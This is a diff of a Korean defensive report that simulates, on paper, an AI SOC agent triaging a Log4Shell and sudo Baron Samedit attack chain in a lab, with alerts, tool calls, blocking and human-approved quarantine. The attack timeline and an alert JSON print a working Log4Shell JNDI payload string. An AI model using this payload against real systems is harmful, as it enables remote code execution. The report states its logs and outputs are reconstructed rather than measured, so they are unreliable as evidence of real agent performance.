@@ -1,11 +1,11 @@
 # Agentic SOC 시뮬레이션 보고서 — 실제 CVE 기반 다단계 공격 대응
 
 작성일: 2026-09-18
-대상 모델: Qwen3-30B-A3B-Instruct-2507 (MoE, 활성 3B)
-실행 환경(가정): ESXi 온프레미스(Groot_A/B/C VM) + Kali 노트북, LLM은 DGX Spark(권장 A-1), vLLM(OpenAI 호환 API)
+대상 모델: `qwen3.6:35b` (tool calling + thinking) — DGX Spark의 Ollama에서 서빙 (6·9·10장의 성능·품질 추정치는 후보였던 Qwen3-30B-A3B(MoE, 활성 3B) 기준값이며 배포 모델로 재측정 필요)
+실행 환경: ESXi 온프레미스(Groot_A/B/C VM) + Kali(VM 세그먼트). Agent 런타임은 Groot_B의 Hermes 컨테이너, 추론만 DGX Spark의 Ollama(OpenAI 호환 `/v1`, `211.170.162.110`/`211.170.162.111`)에서 수행
 관련 문서: [PLAN.md](PLAN.md), [suggestion.md](suggestion.md)
 
-> 이 문서는 환경이 구축되었다고 가정한 **모의(paper) 시뮬레이션**이다. 실제 로그와 모델 출력을 수집한 것이 아니라, 실제 CVE의 공개된 동작을 근거로 설계대로 동작했을 때의 흐름을 재구성한 것이다. 성능 수치는 아래 6장에 계산 근거를 제시하되, 실제 측정으로 대체되어야 한다.
+> 이 문서는 **모의(paper) 시뮬레이션**이다. 인프라(Groot_A/B/C, Wazuh SIEM, Suricata IPS, ModSecurity WAF, Hermes↔DGX↔MCP, Mattermost 승인)는 실제로 구축·검증되어 에이전트 E2E가 동작하는 상태이지만, 이 다단계 공격 시나리오 자체는 아직 공개 익스플로릿으로 재현하지 않았다(10장 참조). 따라서 아래 로그와 모델 출력은 실제 수집물이 아니라, 실제 CVE의 공개된 동작을 근거로 설계대로 동작했을 때의 흐름을 재구성한 것이다. 성능 수치는 아래 6장에 계산 근거를 제시하되, 실제 측정으로 대체되어야 한다.
 
 ---
 
@@ -16,8 +16,8 @@
 | 시나리오 | Scenario 4 — 실제 CVE 기반 다단계 공격 |
 | 초기 침투 CVE | **CVE-2021-44228 (Log4Shell)** — CVSS 10.0, CISA KEV 등재 |
 | 권한 상승 CVE | **CVE-2021-3156 (sudo Baron Samedit)** — CVSS 7.8, CISA KEV 등재 |
-| 공격자 | Kali (공격자 노트북, 192.168.10.20), 외부 세그먼트. 공개 PoC + 악성 LDAP 서버 |
-| 피해 대상 | Groot_C (웹서버 VM, 172.16.20.10), DVWA + 취약 log4j 번들 웹앱 + 취약 sudo 패키지 |
+| 공격자 | Kali (공격자, 192.168.10.20), VM 세그먼트(공격 트래픽은 캠퍼스 VPN 경유 금지). 공개 PoC + 악성 LDAP 서버 |
+| 피해 대상 | Groot_C (웹서버 VM `groot-web`, 10.200.10.20, Wazuh agent `002`), DVWA + 취약 log4j 번들 웹앱 + 취약 sudo 패키지 |
 | 트리거 | Suricata Log4j JNDI 시그니처 → Wazuh Alert (level 12) → Indexer 폴링으로 Agent 수신 |
 | Ground Truth | 다단계 공격 성공, log4shell로 코드 실행, sudo로 root 권한 상승, 데이터 유출. 적절 대응 = 출발지/유출지 차단(자동) + 서버 격리(사람 승인) |
 
@@ -31,7 +31,7 @@
 |---|---|---|---|
 | 14:02:11 | 정찰 (T1595) | nmap SYN 스캔 | Suricata ET SCAN |
 | 14:07:44 | 취약점 스캔 (T1595) | 웹 스캐너, log4j 탐지 페이로드 | 404/에러 폭증 |
-| 14:15:02 | 초기 침투 (T1190) | `User-Agent: ${jndi:ldap://192.168.10.20:1389/x}` 요청 → 서버가 공격자 LDAP로 outbound | **Suricata Log4j JNDI 룰 + 172.16.20.10→192.168.10.20:1389 아웃바운드** |
+| 14:15:02 | 초기 침투 (T1190) | `User-Agent: ${jndi:ldap://192.168.10.20:1389/x}` 요청 → 서버가 공격자 LDAP로 outbound | **Suricata Log4j JNDI 룰 + 10.200.10.20→192.168.10.20:1389 아웃바운드** |
 | 14:15:04 | 코드 실행 (T1059) | 악성 클래스 로드 → 앱 계정 리버스 셸 | www-data의 sh→java→python3 프로세스 |
 | 14:18:20 | 권한 상승 (T1068) | sudo Baron Samedit(CVE-2021-3156)로 root 획득 | sudo 비정상 실행, root 프로세스 |
 | 14:22:48 | 유출 (T1041) | DB 덤프를 203.0.113.77:4444로 전송 | Suricata 의심 아웃바운드, 신규 포트 |
@@ -49,8 +49,8 @@ Wazuh는 14:15:05에 Suricata Log4j JNDI 시그니처를 level 12 Alert로 생�
   "rule": { "id": 86600, "level": 12,
             "description": "Suricata: ET EXPLOIT Apache log4j RCE Attempt (JNDI LDAP)",
             "mitre": { "id": ["T1190"], "tactic": ["Initial Access"] } },
-  "agent": { "id": "003", "name": "groot-web", "ip": "172.16.20.10" },
-  "data": { "src_ip": "192.168.10.20", "dest_ip": "172.16.20.10",
+  "agent": { "id": "002", "name": "groot-web", "ip": "10.200.10.20" },
+  "data": { "src_ip": "192.168.10.20", "dest_ip": "10.200.10.20",
             "payload": "User-Agent: ${jndi:ldap://192.168.10.20:1389/x}" }
 }
 ```
@@ -61,12 +61,12 @@ Agent 추론: "JNDI LDAP 페이로드는 Log4Shell 패턴이다. 먼저 이 호�
 
 호출:
 ```
-wazuh_get_vulnerabilities(agent_id="003")
-network_search_suricata(src_ip="172.16.20.10", since="15m")
+wazuh_get_vulnerabilities(agent_id="002")
+network_search_suricata(src_ip="10.200.10.20", since="15m")
 ```
 응답(요약):
 - 취약점 목록: sudo 1.9.5 (**CVE-2021-3156, KEV**), 그 외. log4j는 앱 jar 내부라 패키지 목록에는 없음.
-- Suricata: **14:15:03 172.16.20.10 → 192.168.10.20:1389 LDAP 아웃바운드 성공**. JNDI 콜백이 실제로 나갔음을 확인.
+- Suricata: **14:15:03 10.200.10.20 → 192.168.10.20:1389 LDAP 아웃바운드 성공**. JNDI 콜백이 실제로 나갔음을 확인.
 
 판단 갱신: outbound가 성립했으므로 Log4Shell 익스플로잇이 트리거됨. 코드 실행 가능성 높음.
 
@@ -86,8 +86,8 @@ Agent: KEV 등재 + 실제 아웃바운드 관측 → 위험도 critical로 상�
 
 호출:
 ```
-server_get_processes(agent_id="003")
-server_get_fim_events(agent_id="003", since="15m")
+server_get_processes(agent_id="002")
+server_get_fim_events(agent_id="002", since="15m")
 ```
 응답(요약):
 - 프로세스: `www-data`의 java 프로세스가 `/bin/sh -c` → `python3 -c "...socket..."` 자식 보유 (리버스 셸 패턴)
@@ -101,8 +101,8 @@ Agent 추론: "턴 1에서 이 호스트는 CVE-2021-3156(sudo)에 취약하다.
 
 호출:
 ```
-server_get_auth_events(agent_id="003", since="15m")
-server_run_readonly(agent_id="003", cmd="ps -eo user,pid,cmd | grep -E '^root'")   # SSH 읽기전용, 허용 명령
+server_get_auth_events(agent_id="002", since="15m")
+server_run_readonly(agent_id="002", cmd="ps -eo user,pid,cmd | grep -E '^root'")   # SSH 읽기전용, 허용 명령
 ```
 응답(요약):
 - auth: 정상 로그인은 없으나 14:18 sudo 관련 비정상 로그
@@ -114,9 +114,9 @@ Agent: CVE-2021-3156 경로로 root 획득 확인. 사전에 취약점 목록에
 
 호출:
 ```
-network_search_suricata(src_ip="172.16.20.10", since="10m")
+network_search_suricata(src_ip="10.200.10.20", since="10m")
 ```
-응답: 14:22 172.16.20.10 → 203.0.113.77:4444 지속 아웃바운드, 대용량 전송.
+응답: 14:22 10.200.10.20 → 203.0.113.77:4444 지속 아웃바운드, 대용량 전송.
 
 최종 출력(JSON):
 ```json
@@ -138,7 +138,7 @@ network_search_suricata(src_ip="172.16.20.10", since="10m")
   "proposed_actions": [
     { "action": "block_ip", "target": "192.168.10.20", "reason": "attack source / LDAP callback" },
     { "action": "block_ip", "target": "203.0.113.77", "reason": "exfil destination" },
-    { "action": "quarantine_server", "target": "groot-web (172.16.20.10)", "reason": "root compromise + active exfil" }
+    { "action": "quarantine_server", "target": "groot-web (10.200.10.20)", "reason": "root compromise + active exfil" }
   ],
   "remediation": [
     "log4j 2.17.1+ 업그레이드 또는 log4j2.formatMsgNoLookups=true",
@@ -157,7 +157,7 @@ Agent는 근본 원인을 실제 CVE로 특정하고, 대응뿐 아니라 패치
 |---|---|---|---|
 | 192.168.10.20 차단 | critical/high | **자동 실행** | 되돌릴 수 있는 임시 차단(1h), 보호 IP 아님 |
 | 203.0.113.77 차단 | critical/high | **최소범위 임시 차단 후 통보** | 진행 중 유출, 즉시 차단이 안전 |
-| 서버 격리 | critical | **사람 승인 요청** | 서비스 중단 영향, Slack 승인 (Socket Mode) |
+| 서버 격리 | critical | **사람 승인 요청** | 서비스 중단 영향, 온프레미스 Mattermost 인터랙티브 버튼 승인 (Tier 2) |
 
 담당자 승인 후 Groot_A FW로 세그먼트 격리. 근본 원인이 CVE로 특정되어 있어 승인 판단이 빠르다.
 
@@ -176,7 +176,7 @@ Agent는 근본 원인을 실제 CVE로 특정하고, 대응뿐 아니라 패치
 
 ## 6. 성능 추정치 (계산 근거 포함)
 
-DGX Spark GB10은 LPDDR5x 통합 메모리로 대역폭이 약 273 GB/s로 알려져 있다(데이터센터 GPU 대비 낮음). 배치 1 토큰 생성은 메모리 대역폭에 지배된다.
+배포 추론 서버는 DGX Spark의 Ollama(`211.170.162.110`/`211.170.162.111`)다. DGX Spark GB10은 LPDDR5x 통합 메모리로 대역폭이 약 273 GB/s로 알려져 있다(데이터센터 GPU 대비 낮음). 배치 1 토큰 생성은 메모리 대역폭에 지배된다. 아래 추정치는 후보였던 Qwen3-30B-A3B(MoE, 활성 3B) 기준으로 산출한 값이며, 실제 배포 모델 `qwen3.6:35b`는 파라미터 수·양자화가 달라 재측정이 필요하다(수치는 실측 전까지 추정치로 유지).
 
 ```
 Qwen3-30B-A3B: 토큰당 활성 3B 파라미터
